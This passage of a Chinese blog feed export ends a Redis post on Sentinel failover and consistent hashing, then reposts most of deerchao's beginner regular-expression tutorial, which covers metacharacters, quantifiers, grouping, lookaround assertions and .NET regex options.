<li>在经历了以上两轮淘汰之后 剩下来的从服务器中， 我们选出 复制偏移量（replication offset<br> ）最大 的那个(越大说明数据越比较新) 从服务器 作为新的主服务器；如果复制偏移量不可用，或者从服务器的复制偏移量相同，那么 带有最小运行 ID 的那个从服务器成为新的主服务器。</li>
</ul>
</li>
</ol>
<h4 id="Redis-集群"><a href="#Redis-集群" class="headerlink" title="Redis 集群"></a>Redis 集群</h4><p>维护一个hash 环，服务器作为Hash 环上的节点，求 hash 时会落到节点附近，这个时候按顺时针找到第一个节点即为存放节点。按顺时针会有一个问题就是如果环上的点较为集中会使得hash<br>全部打在顺向的的同一个节点上，因此引入了虚拟节点的概念，让节点本身承担虚拟节点，这样就会得到一个均匀的环，当然虚拟的节点最终会打在实际的服务节点上。</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>Middleware</tag>
        <tag>Cache</tag>
      </tags>
  </entry>
  <entry>
    <title>(转)Regex</title>
    <url>/2017/09/23/regex/</url>
    <content><![CDATA[<blockquote>
<p>本文由 <a class="link"   href="http://ksria.com/simpread/" >简悦 SimpRead<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 转码， 原文地址 <a class="link"   href="http://www.cnblogs.com/deerchao/archive/2006/08/24/zhengzhe30fengzhongjiaocheng.html" >http://www.cnblogs.com/deerchao/archive/2006/08/24/zhengzhe30fengzhongjiaocheng.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<p>来园子之前写的一篇<a class="link"   href="http://deerchao.net/tutorials/regex/regex.htm" >正则表达式教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，部分翻译自 codeproject 的 <a class="link"   href="http://www.codeproject.com/dotnet/regextutorial.asp" >The 30 Minute Regex Tutorial<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。 由于评论里有过长的 URL, 所以本页排版比较混乱, 推荐你<a class="link"   href="http://deerchao.net/tutorials/regex/regex.htm" >到原处查看<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, 看完了如果有问题, 再到这里来提出. 一些要说的话：</p>
<ol>
<li>如果你没有正则表达式的基础，请跟着教程 “一步步来”。请不要大概地扫两眼就说看不懂——以这种态度我写成什么样你也看不懂。当我告诉你这是“30 分钟入门教程” 时，请不要试图在 30 秒内入门。 事实是，我身边有个才接触电脑，对操作都不是很熟练的人通过自己学习这篇教程，最后都能在文章采集系统中使用正则表达式完成任务。而且，他写的表达式中，还使用了 “零宽断言” 等“高级”技术。 所以，如果你能具体地说明你的问题，我很愿意帮助你。但是如果你概括地说看不懂，那不是我的问题。</li>
<li>欢迎转载，但请声明作者以及来源。</li>
</ol>
<h1 id="正则表达式-30-分钟入门教程"><a href="#正则表达式-30-分钟入门教程" class="headerlink" title="正则表达式 30 分钟入门教程"></a>正则表达式 30 分钟入门教程</h1><p>版本：v2.31 (2009-4-11) 作者：<a class="link"   href="http://deerchao.net/" >deerchao<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 转载请注明<a class="link"   href="http://deerchao.net/tutorials/regex/regex.htm" >来源<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="本文目标"><a href="#本文目标" class="headerlink" title="本文目标"></a>本文目标</h2><p>30 分钟内让你明白正则表达式是什么，并对它有一些基本的了解，让你可以在自己的程序或网页里使用它。</p>
<h2 id="如何使用本教程"><a href="#如何使用本教程" class="headerlink" title="如何使用本教程"></a>如何使用本教程</h2><p>最重要的是——请给我 _30 分钟_，如果你没有使用正则表达式的经验，请不要试图在 30 _秒_内入门——除非你是超人 :) 别被下面那些复杂的表达式吓倒，只要跟着我一步一步来，你会发现正则表达式其实并没有你想像中的那么困难。当然，如果你看完了这篇教程之后，发现自己明白了很多，却又几乎什么都记不得，那也是很正常的——我认为，没接触过正则表达式的人在看完这篇教程后，能把提到过的语法记住 80% 以上的可能性为零。这里只是让你明白基本的原理，以后你还需要多练习，多使用，才能熟练掌握正则表达式。 除了作为入门教程之外，本文还试图成为可以在日常工作中使用的正则表达式语法参考手册。就作者本人的经历来说，这个目标还是完成得不错的——你看，我自己也没能把所有的东西记下来，不是吗？ <a class="link"   href="http://deerchao.net/tutorials/regex/regex.htm" >清除格式<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 文本格式约定：专业术语 元字符 &#x2F; 语法格式 正则表达式 正则表达式中的一部分 (用于分析) 对其进行匹配的源字符串 对正则表达式或其中一部分的说明 <a class="link"   href="http://deerchao.net/tutorials/regex/regex.htm" >隐藏边注<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 本文右边有一些注释，主要是用来提供一些相关信息，或者给没有程序员背景的读者解释一些基本概念，通常可以忽略。</p>
<h2 id="正则表达式到底是什么东西？"><a href="#正则表达式到底是什么东西？" class="headerlink" title="正则表达式到底是什么东西？"></a>正则表达式到底是什么东西？</h2><p>字符是计算机软件处理文字时最基本的单位，可能是字母，数字，标点符号，空格，换行符，汉字等等。字符串是 0 个或更多个字符的序列。文本也就是文字，字符串。说某个字符串匹配某个正则表达式，通常是指这个字符串里有一部分（或几部分分别）能满足表达式给出的条件。 在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。 很可能你使用过 Windows&#x2F;Dos 下用于文件查找的通配符 (wildcard)，也就是 * 和?。如果你想查找某个目录下的所有的 Word 文档的话，你会搜索 <em>.doc。在这里，</em> 会被解释成任意的字符串。和通配符类似，正则表达式也是用来进行文本匹配的工具，只不过比起通配符，它能更精确地描述你的需求——当然，代价就是更复杂——比如你可以编写一个正则表达式，用来查找所有以 0 开头，后面跟着 2-3 个数字，然后是一个连字号 “-”，最后是 7 或 8 位数字的字符串 (像 010-12345678 或 0376-7654321)。</p>
<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>学习正则表达式的最好方法是从例子开始，理解例子之后再自己对例子进行修改，实验。下面给出了不少简单的例子，并对它们作了详细的说明。 假设你在一篇英文小说里查找 hi，你可以使用正则表达式 hi。 这几乎是最简单的正则表达式了，它可以精确匹配这样的字符串：由两个字符组成，前一个字符是 h, 后一个是 i。通常，处理正则表达式的工具会提供一个忽略大小写的选项，如果选中了这个选项，它可以匹配 hi,HI,Hi,hI 这四种情况中的任意一种。 不幸的是，很多单词里包含 hi 这两个连续的字符，比如 him,history,high 等等。用 hi 来查找的话，这里边的 hi 也会被找出来。如果要精确地查找 hi 这个单词的话，我们应该使用 \bhi\b。 \b 是正则表达式规定的一个特殊代码（好吧，某些人叫它元字符，metacharacter），代表着单词的开头或结尾，也就是单词的分界处。虽然通常英文的单词是由空格，标点符号或者换行来分隔的，但是 \b 并不匹配这些单词分隔字符中的任何一个，它<strong>只匹配一个位置</strong>。 如果需要更精确的说法，\b 匹配这样的位置：它的前一个字符和后一个字符不全是 (一个是, 一个不是或不存在)\w。 假如你要找的是 hi 后面不远处跟着一个 Lucy，你应该用 \bhi\b.<em>\bLucy\b。 这里，. 是另一个元字符，匹配除了换行符以外的任意字符。</em> 同样是元字符，不过它代表的不是字符，也不是位置，而是数量——它指定 * 前边的内容可以连续重复使用任意次以使整个表达式得到匹配。因此，.* 连在一起就意味着任意数量的不包含换行的字符。现在 \bhi\b.*\bLucy\b 的意思就很明显了：先是一个单词 hi, 然后是任意个任意字符 (但不能是换行)，最后是 Lucy 这个单词。 换行符就是’\n’,ASCII 编码为 10(十六进制 0x0A) 的字符。 如果同时使用其它元字符，我们就能构造出功能更强大的正则表达式。比如下面这个例子： 0\d\d-\d\d\d\d\d\d\d\d 匹配这样的字符串：以 0 开头，然后是两个数字，然后是一个连字号 “-”，最后是 8 个数字 (也就是中国的电话号码。当然，这个例子只能匹配区号为 3 位的情形)。 这里的 \d 是个新的元字符，匹配一位数字 (0，或 1，或 2，或……)。- 不是元字符，只匹配它本身——连字符 (或者减号，或者中横线，或者随你怎么称呼它)。 为了避免那么多烦人的重复，我们也可以这样写这个表达式：0\d{2}-\d{8}。 这里 \d 后面的 {2}({8}) 的意思是前面 \d 必须连续重复匹配 2 次 (8 次)。</p>
<h2 id="测试正则表达式"><a href="#测试正则表达式" class="headerlink" title="测试正则表达式"></a>测试正则表达式</h2><p>其它可用的测试工具:</p>
<ul>
<li><a class="link"   href="http://www.regexbuddy.com/" >RegexBuddy<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="http://regexpal.com/" >Javascript 正则表达式在线测试工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>如果你不觉得正则表达式很难读写的话，要么你是一个天才，要么，你不是地球人。正则表达式的语法很令人头疼，即使对经常使用它的人来说也是如此。由于难于读写，容易出错，所以找一种工具对正则表达式进行测试是很有必要的。</p>
<h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>现在你已经知道几个很有用的元字符了，如 \b,.,*，还有 \d. 正则表达式里还有更多的元字符，比如 \s 匹配任意的空白符，包括空格，制表符 (Tab)，换行符，中文全角空格等。\w 匹配字母或数字或下划线或汉字等。 对中文 &#x2F; 汉字的特殊处理是由. Net 提供的正则表达式引擎支持的，其它环境下的具体情况请查看相关文档。 下面来看看更多的例子： \ba\w_\b 匹配以字母 a 开头的单词——先是某个单词开始处 (\b)，然后是字母 a, 然后是任意数量的字母或数字 (\w_)，最后是单词结束处 (\b)。 好吧，现在我们说说正则表达式里的单词是什么意思吧：就是不少于一个的连续的 \w。不错，这与学习英文时要背的成千上万个同名的东西的确关系不大 :) \d+ 匹配 1 个或更多连续的数字。这里的 + 是和 * 类似的元字符，不同的是 * 匹配重复任意次 (可能是 0 次)，而 + 则匹配重复 1 次或更多次。 \b\w{6}\b 匹配刚好 6 个字符的单词。 表 1. 常用的元字符</p>
<p>代码</p>
<p>说明</p>
<p>.</p>
<p>匹配除换行符以外的任意字符</p>
<p>\w</p>
<p>匹配字母或数字或下划线或汉字</p>
<p>\s</p>
<p>匹配任意的空白符</p>
<p>\d</p>
<p>匹配数字</p>
<p>\b</p>
<p>匹配单词的开始或结束</p>
<p>^</p>
<p>匹配字符串的开始</p>
<p>$</p>
<p>匹配字符串的结束</p>
<p>正则表达式引擎通常会提供一个 “测试指定的字符串是否匹配一个正则表达式” 的方法，如 JavaScript 里的 RegExp.test()方法或. NET 里的 Regex.IsMatch()方法。这里的匹配是指是字符串里有没有符合表达式规则的部分。如果不使用 ^ 和 $ 的话，对于 \d{5,12} 而言，使用这样的方法就只能保证字符串里包含 5 到 12 连续位数字，而不是整个字符串就是 5 到 12 位数字。 元字符 ^（和数字 6 在同一个键位上的符号）和 $ 都匹配一个位置，这和 \b 有点类似。^ 匹配你要用来查找的字符串的开头，$ 匹配结尾。这两个代码在验证输入的内容时非常有用，比如一个网站如果要求你填写的 QQ 号必须为 5 位到 12 位数字时，可以使用：^\d{5,12}$。 这里的 {5,12} 和前面介绍过的 {2} 是类似的，只不过 {2} 匹配只能不多不少重复 2 次，{5,12} 则是重复的次数不能少于 5 次，不能多于 12 次，否则都不匹配。 因为使用了 ^ 和 $，所以输入的整个字符串都要用来和 \d{5,12} 来匹配，也就是说整个输入必须是 5 到 12 个数字，因此如果输入的 QQ 号能匹配这个正则表达式的话，那就符合要求了。 和忽略大小写的选项类似，有些正则表达式处理工具还有一个处理多行的选项。如果选中了这个选项，^ 和 $ 的意义就变成了匹配行的开始处和结束处。</p>
<h2 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h2><p>如果你想查找元字符本身的话，比如你查找., 或者 *, 就出现了问题：你没办法指定它们，因为它们会被解释成别的意思。这时你就得使用 \ 来取消这些字符的特殊意义。因此，你应该使用 . 和 *。当然，要查找 \ 本身，你也得用 \. 例如：unibetter.com 匹配 unibetter.com，C:\Windows 匹配 C:\Windows。</p>
<h2 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h2><p>你已经看过了前面的 *,+,{2},{5,12} 这几个匹配重复的方式了。下面是正则表达式中所有的限定符 (指定数量的代码，例如 *,{5,12} 等)： 表 2. 常用的限定符</p>
<p>代码 &#x2F; 语法</p>
<p>说明</p>
<ul>
<li></li>
</ul>
<p>重复零次或更多次</p>
<ul>
<li></li>
</ul>
<p>重复一次或更多次</p>
<p>?</p>
<p>重复零次或一次</p>
<p>{n}</p>
<p>重复 n 次</p>
<p>{n,}</p>
<p>重复 n 次或更多次</p>
<p>{n,m}</p>
<p>重复 n 到 m 次</p>
<p>下面是一些使用重复的例子： Windows\d+ 匹配 Windows 后面跟 1 个或更多数字 ^\w+ 匹配一行的第一个单词 (或整个字符串的第一个单词，具体匹配哪个意思得看选项设置)</p>
<h2 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h2><p>要想查找数字，字母或数字，空白是很简单的，因为已经有了对应这些字符集合的元字符，但是如果你想匹配没有预定义元字符的字符集合 (比如元音字母 a,e,i,o,u), 应该怎么办？ 很简单，你只需要在方括号里列出它们就行了，像 [aeiou] 就匹配任何一个英文元音字母，[.?!] 匹配标点符号 (. 或? 或!)。 我们也可以轻松地指定一个字符范围，像 [0-9] 代表的含意与 \d 就是完全一致的：一位数字；同理 [a-z0-9A-Z_] 也完全等同于 \w（如果只考虑英文的话）。 下面是一个更复杂的表达式：<code>\(?0\d&#123;2&#125;[) -]?\d&#123;8&#125;</code>。 “(”和 “)” 也是元字符，后面的<a href="http://#grouping">分组节</a>里会提到，所以在这里需要使用<a href="http://#escape">转义</a>。 这个表达式可以匹配几种格式的电话号码，像 (010)88886666，或 022-22334455，或 02912345678 等。我们对它进行一些分析吧：首先是一个转义字符 (, 它能出现 0 次或 1 次 (?), 然后是一个 0，后面跟着 2 个数字 (\d{2})，然后是) 或 - 或空格中的一个，它出现 1 次或不出现 (?)，最后是 8 个数字 (\d{8})。</p>
<h2 id="分枝条件"><a href="#分枝条件" class="headerlink" title="分枝条件"></a>分枝条件</h2><p>不幸的是，刚才那个表达式也能匹配 010)12345678 或 (022-87654321 这样的 “不正确” 的格式。要解决这个问题，我们需要用到分枝条件。正则表达式里的分枝条件指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，具体方法是用 | 把不同的规则分隔开。听不明白？没关系，看例子： <code>0\d&#123;2&#125;-\d&#123;8&#125;|0\d&#123;3&#125;-\d&#123;7&#125;</code> 这个表达式能匹配两种以连字号分隔的电话号码：一种是三位区号，8 位本地号 (如 010-12345678)，一种是 4 位区号，7 位本地号 (0376-2233445)。 <code>\(0\d&#123;2&#125;\)[- ]?\d&#123;8&#125;|0\d&#123;2&#125;[- ]?\d&#123;8&#125;</code>这个表达式匹配 3 位区号的电话号码，其中区号可以用小括号括起来，也可以不用，区号与本地号间可以用连字号或空格间隔，也可以没有间隔。你可以试试用分枝条件把这个表达式扩展成也支持 4 位区号的。 \d{5}-\d{4}|\d{5} 这个表达式用于匹配美国的邮政编码。美国邮编的规则是 5 位数字，或者用连字号间隔的 9 位数字。之所以要给出这个例子是因为它能说明一个问题：<strong>使用分枝条件时，要注意各个条件的顺序</strong>。如果你把它改成 <code>\d&#123;5&#125;|\d&#123;5&#125;-\d&#123;4&#125;</code> 的话，那么就只会匹配 5 位的邮编 (以及 9 位邮编的前 5 位)。原因是匹配分枝条件时，将会从左到右地测试每个条件，如果满足了某个分枝的话，就不会去再管其它的条件了。</p>
<h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><p>我们已经提到了怎么重复单个字符（直接在字符后面加上限定符就行了）；但如果想要重复多个字符又该怎么办？你可以用小括号来指定子表达式 (也叫做分组)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作 (后面会有介绍)。 <code>(\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;</code> 是一个简单的 IP 地址匹配表达式。要理解这个表达式，请按下列顺序分析它：\d{1,3} 匹配 1 到 3 位的数字，(\d{1,3}.){3} 匹配三位数字加上一个英文句号 (这个整体也就是这个分组) 重复 3 次，最后再加上一个一到三位的数字 (\d{1,3})。 IP 地址中每个数字都不能大于 255，大家千万不要被《24》第三季的编剧给忽悠了…… 不幸的是，它也将匹配 256.300.888.999 这种不可能存在的 IP 地址。如果能使用算术比较的话，或许能简单地解决这个问题，但是正则表达式中并不提供关于数学的任何功能，所以只能使用冗长的分组，选择，字符类来描述一个正确的 IP 地址：((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)。 理解这个表达式的关键是理解 2[0-4]\d|25[0-5]|[01]?\d\d?，这里我就不细说了，你自己应该能分析得出来它的意义。</p>
<h2 id="反义"><a href="#反义" class="headerlink" title="反义"></a>反义</h2><p>有时需要查找不属于某个能简单定义的字符类的字符。比如想查找除了数字以外，其它任意字符都行的情况，这时需要用到反义： 表 3. 常用的反义代码</p>
<p>代码 &#x2F; 语法</p>
<p>说明</p>
<p>\W</p>
<p>匹配任意不是字母，数字，下划线，汉字的字符</p>
<p>\S</p>
<p>匹配任意不是空白符的字符</p>
<p>\D</p>
<p>匹配任意非数字的字符</p>
<p>\B</p>
<p>匹配不是单词开头或结束的位置</p>
<p>[^x]</p>
<p>匹配除了 x 以外的任意字符</p>
<p>[^aeiou]</p>
<p>匹配除了 aeiou 这几个字母以外的任意字符</p>
<p>例子：\S+ 匹配不包含空白符的字符串。 &lt;a[^&gt;]+&gt; 匹配用尖括号括起来的以 a 开头的字符串。</p>
<h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>使用小括号指定一个子表达式后，<strong>匹配这个子表达式的文本</strong> (也就是此分组捕获的内容) 可以在表达式或其它程序中作进一步的处理。默认情况下，每个分组会自动拥有一个组号，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为 1，第二个为 2，以此类推。 呃…… 其实, 组号分配还不像我刚说得那么简单：</p>
<ul>
<li>分组 0 对应整个正则表达式</li>
<li>实际上组号分配过程是要从左向右扫描两遍的：第一遍只给未命名组分配，第二遍只给命名组分配－－因此所有命名组的组号都大于未命名的组号</li>
<li>你可以使用 (?:exp) 这样的语法来剥夺一个分组对组号分配的参与权．</li>
</ul>
<p>后向引用用于重复搜索前面某个分组匹配的文本。例如，\1 代表分组 1 匹配的文本。难以理解？请看示例： \b(\w+)\b\s+\1\b 可以用来匹配重复的单词，像 go go, 或者 kitty kitty。这个表达式首先是一个单词，也就是单词开始处和结束处之间的多于一个的字母或数字 (\b(\w+)\b)，这个单词会被捕获到编号为 1 的分组中，然后是 1 个或几个空白符 (\s+)，最后是分组 1 中捕获的内容（也就是前面匹配的那个单词）(\1)。 你也可以自己指定子表达式的组名。要指定一个子表达式的组名，请使用这样的语法：(?\w+)(或者把尖括号换成’也行：(?’Word’\w+)), 这样就把 \w+ 的组名指定为 Word 了。要反向引用这个分组捕获的内容，你可以使用 \k, 所以上一个例子也可以写成这样：\b(?\w+)\b\s+\k\b。 使用小括号的时候，还有很多特定用途的语法。下面列出了最常用的一些： 表 4. 常用分组语法 | 分类 | 代码 &#x2F; 语法 | 说明 | | 捕获 | (exp) | 匹配 exp, 并捕获文本到自动命名的组里 | | (?exp) | 匹配 exp, 并捕获文本到名称为 name 的组里，也可以写成 (?’name’exp) | | (?:exp) | 匹配 exp, 不捕获匹配的文本，也不给此分组分配组号 | | 零宽断言 | (?&#x3D;exp) | 匹配 exp 前面的位置 | | (?&lt;&#x3D;exp) | 匹配 exp 后面的位置 | | (?!exp) | 匹配后面跟的不是 exp 的位置 | | (?&lt;!exp) | 匹配前面不是 exp 的位置 | | 注释 | (?#comment) | 这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读 | 我们已经讨论了前两种语法。第三个 (?:exp) 不会改变正则表达式的处理方式，只是这样的组匹配的内容不会像前两种那样被捕获到某个组里面，也不会拥有组号。“我为什么会想要这样做？”——好问题，你觉得为什么呢？</p>
<h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>地球人，是不是觉得这些术语名称太复杂，太难记了？我也有同感。知道有这么一种东西就行了，它叫什么，随它去吧！人若无名，便可专心练剑；物若无名，便可随意取舍…… 接下来的四个用于查找在某些内容 (但并不包括这些内容) 之前或之后的东西，也就是说它们像 \b,^,$ 那样用于指定一个位置，这个位置应该满足一定的条件 (即断言)，因此它们也被称为零宽断言。最好还是拿例子来说明吧： 断言用来声明一个应该为真的事实。正则表达式中只有当断言为真时才会继续进行匹配。 <code>(?=exp)</code> 也叫零宽度正预测先行断言，它断言自身出现的位置的后面能匹配表达式 exp。比如 <code>\b\w+(?=ing\b)</code>，匹配以 ing 结尾的单词的前面部分 (除了 ing 以外的部分)，如查找 I’m singing while you’re dancing. 时，它会匹配 sing 和 danc。 (?&lt;&#x3D;exp) 也叫零宽度正回顾后发断言，它断言自身出现的位置的前面能匹配表达式 exp。比如 (?&lt;&#x3D;\bre)\w+\b 会匹配以 re 开头的单词的后半部分 (除了 re 以外的部分)，例如在查找 reading a book 时，它匹配 ading。 假如你想要给一个很长的数字中每三位间加一个逗号 (当然是从右边加起了)，你可以这样查找需要在前面和里面添加逗号的部分：<code>((?&lt;=\d)\d&#123;3&#125;)+\b</code>，用它对 1234567890 进行查找时结果是 234567890。 下面这个例子同时使用了这两种断言：<code>(?&lt;=\s)\d+(?=\s)</code> 匹配以空白符间隔的数字 (再次强调，不包括这些空白符)。</p>
<h2 id="负向零宽断言"><a href="#负向零宽断言" class="headerlink" title="负向零宽断言"></a>负向零宽断言</h2><p>前面我们提到过怎么查找<strong>不是某个字符或不在某个字符类里</strong>的字符的方法 (反义)。但是如果我们只是想要<strong>确保某个字符没有出现，但并不想去匹配它</strong>时怎么办？例如，如果我们想查找这样的单词 -- 它里面出现了字母 q, 但是 q 后面跟的不是字母 u, 我们可以尝试这样： \b\w_q[^u]\w_\b 匹配包含<strong>后面不是字母 u 的字母 q</strong> 的单词。但是如果多做测试 (或者你思维足够敏锐，直接就观察出来了)，你会发现，如果 q 出现在单词的结尾的话，像 <strong>Iraq</strong>,<strong>Benq</strong>，这个表达式就会出错。这是因为 [^u] 总要匹配一个字符，所以如果 q 是单词的最后一个字符的话，后面的 [^u] 将会匹配 q 后面的单词分隔符 (可能是空格，或者是句号或其它的什么)，后面的 \w_\b 将会匹配下一个单词，于是 \b\w_q[^u]\w_\b 就能匹配整个 Iraq fighting。负向零宽断言能解决这样的问题，因为它只匹配一个位置，并不<strong>消费</strong>任何字符。现在，我们可以这样来解决这个问题：\b\w_q(?!u)\w<em>\b。 零宽度负预测先行断言 (?!exp)，断言此位置的后面不能匹配表达式 exp。例如：\d{3}(?!\d) 匹配三位数字，而且这三位数字的后面不能是数字；\b((?!abc)\w)+\b 匹配不包含连续字符串 abc 的单词。 同理，我们可以用 (?&lt;!exp), 零宽度负回顾后发断言来断言此位置的前面不能匹配表达式 <code>exp：(?&lt;![a-z])\d&#123;7&#125;</code> 匹配前面不是小写字母的七位数字。 请详细分析表达式 (?&lt;&#x3D;&lt;(\w+)&gt;).</em>(?&#x3D;&lt;\&#x2F;\1&gt;)，这个表达式最能表现零宽断言的真正用途。 一个更复杂的例子：(?&lt;&#x3D;&lt;(\w+)&gt;).<em>(?&#x3D;&lt;\&#x2F;\1&gt;) 匹配不包含属性的简单 HTML 标签内里的内容。(?&lt;&#x3D;&lt;(\w+)&gt;) 指定了这样的前缀：被尖括号括起来的单词 (比如可能是 &lt; b&gt;)，然后是.</em>(任意的字符串), 最后是一个后缀 (?&#x3D;&lt;\&#x2F;\1&gt;)。注意后缀里的 \&#x2F;，它用到了前面提过的字符转义；\1 则是一个反向引用，引用的正是捕获的第一组，前面的 (\w+) 匹配的内容，这样如果前缀实际上是 <strong>的话，后缀就是</strong> 了。整个表达式匹配的是 &lt; b &gt; 和 之间的内容 (再次提醒，不包括前缀和后缀本身)。</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>小括号的另一种用途是通过语法 (?#comment) 来包含注释。例如：2[0-4]\d(?#200-249)|25<a href="http://?#250-255">0-5</a>|[01]?\d\d?(?#0-199)。 要包含注释的话，最好是启用 “忽略模式里的空白符” 选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。启用这个选项后，在 #后面到这一行结束的所有文本都将被当成注释忽略掉。例如，我们可以前面的一个表达式写成这样：</p>
<pre><code>(?&lt;=    # 断言要匹配的文本的前缀
      &lt;(\w+)&gt; # 查找尖括号括起来的字母或数字(即HTML/XML标签)
      )       # 前缀结束
      .*      # 匹配任意文本
      (?=     # 断言要匹配的文本的后缀
      &lt;\/\1&gt;  # 查找尖括号括起来的内容：前面是一个&quot;/&quot;，后面是先前捕获的标签
)       # 后缀结束
</code></pre>
<h2 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h2><p>当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配<strong>尽可能多</strong>的字符。以这个表达式为例：a.<em>b，它将会匹配最长的以 a 开始，以 b 结束的字符串。如果用它来搜索 aabab 的话，它会匹配整个字符串 aabab。这被称为贪婪匹配。 有时，我们更需要懒惰匹配，也就是匹配<strong>尽可能少</strong>的字符。前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号?。这样.</em>? 就意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。现在看看懒惰版的例子吧： a.*?b 匹配最短的，以 a 开始，以 b 结束的字符串。如果把它应用于 aabab 的话，它会匹配 aab（第一到第三个字符）和 ab（第四到第五个字符）。 为什么第一个匹配是 aab（第一到第三个字符）而不是 ab（第二到第三个字符）？简单地说，因为正则表达式有另一条规则，比懒惰／贪婪规则的优先级更高：最先开始的匹配拥有最高的优先权——The match that begins earliest wins。 表 5. 懒惰限定符</p>
<p>代码 &#x2F; 语法</p>
<p>说明</p>
<p>*?</p>
<p>重复任意次，但尽可能少重复</p>
<p>+?</p>
<p>重复 1 次或更多次，但尽可能少重复</p>
<p>??</p>
<p>重复 0 次或 1 次，但尽可能少重复</p>
<p>{n,m}?</p>
<p>重复 n 到 m 次，但尽可能少重复</p>
<p>{n,}?</p>
<p>重复 n 次以上，但尽可能少重复</p>
<h2 id="处理选项"><a href="#处理选项" class="headerlink" title="处理选项"></a>处理选项</h2><p>在 C# 中，你可以使用 <a class="link"   href="http://msdn2.microsoft.com/zh-cn/library/h5845fdz.aspx"  title="MSDN 相关文档">Regex(String, RegexOptions) 构造函数<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>来设置正则表达式的处理选项。如：Regex regex &#x3D; new Regex(@”\ba\w{6}\b”, RegexOptions.IgnoreCase); 上面介绍了几个选项如忽略大小写，处理多行等，这些选项能用来改变处理正则表达式的方式。下面是. Net 中常用的正则表达式选项： 表 6. 常用的处理选项</p>
<p>名称</p>
<p>说明</p>
<p>IgnoreCase(忽略大小写)</p>
<p>匹配时不区分大小写。</p>
<p>Multiline(多行模式)</p>
<p>更改 ^ 和 $ 的含义，使它们分别在任意一行的行首和行尾匹配，而不仅仅在整个字符串的开头和结尾匹配。(在此模式下,$ 的精确含意是: 匹配 \ n 之前的位置以及字符串结束前的位置.)</p>
<p>Singleline(单行模式)</p>
<p>更改. 的含义，使它与每一个字符匹配（包括换行符 \ n）。</p>
<p>IgnorePatternWhitespace(忽略空白)</p>
<p>忽略表达式中的非转义空白并启用由#标记的注释。</p>
<p>ExplicitCapture(显式捕获)</p>
<p>仅捕获已被显式命名的组。</p>
<p>一个经常被问到的问题是：是不是只能同时使用多行模式和单行模式中的一种？答案是：不是。这两个选项之间没有任何关系，除了它们的名字比较相似（以至于让人感到疑惑）以外。</p>
<h2 id="平衡组-x2F-递归匹配"><a href="#平衡组-x2F-递归匹配" class="headerlink" title="平衡组 &#x2F; 递归匹配"></a>平衡组 &#x2F; 递归匹配</h2><p>这里介绍的平衡组语法是由. Net Framework 支持的；其它语言／库不一定支持这种功能，或者支持此功能但需要使用不同的语法。 有时我们需要匹配像 (100 * ( 50 + 15) ) 这样的可嵌套的层次性结构，这时简单地使用 (.+) 则只会匹配到最左边的左括号和最右边的右括号之间的内容 (这里我们讨论的是贪婪模式，懒惰模式也有下面的问题)。假如原来的字符串里的左括号和右括号出现的次数不相等，比如 (5 &#x2F; ( 3 + 2) ) )，那我们的匹配结果里两者的个数也不会相等。有没有办法在这样的字符串里匹配到最长的，配对的括号之间的内容呢？ 为了避免 (和 (把你的大脑彻底搞糊涂，我们还是用尖括号代替圆括号吧。现在我们的问题变成了如何把 <code>xx &lt;aa &lt;bbb&gt; &lt;bbb&gt; aa&gt; yy</code> 这样的字符串里，最长的配对的尖括号内的内容捕获出来？ 这里需要用到以下的语法构造：</p>
<ul>
<li>(?’group’) 把捕获的内容命名为 group, 并压入堆栈 (Stack)</li>
<li>(?’-group’) 从堆栈上弹出最后压入堆栈的名为 group 的捕获内容，如果堆栈本来为空，则本分组的匹配失败</li>
